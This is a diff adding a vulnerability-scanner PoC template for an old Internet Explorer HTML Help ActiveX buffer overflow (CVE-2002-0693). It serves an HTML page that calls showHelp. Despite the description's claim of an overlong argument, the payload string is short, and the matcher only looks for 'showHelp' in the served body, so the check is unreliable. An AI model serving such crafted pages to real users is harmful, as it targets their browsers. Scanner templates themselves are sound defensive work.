@@ -1,0 +1,31 @@
+[info]
+author = "ave"
+description = "通过HTTP服务向目标用户发送特制HTML页面，利用hhctrl.ocx的showHelp函数长参数触发栈缓冲区溢出，验证漏洞存在。PoC生成包含超长参数的showHelp调用脚本，当用户使用IE打开页面时触发溢出。"
+id = "POC-AVE-2002-0387"
+name = "Microsoft Windows HTML Help ActiveX Control Buffer Overflow PoC"
+severity = "high"
+tags = ["ave-2002-0387"]
+vuln_id = [
+    "CVE-2002-0693",
+    "AVE-2002-0387",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = '''
+<html><body><script type="text/javascript">
+showHelp("A:\AAAAAAAA");</script></body></html>'''
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["showHelp"]
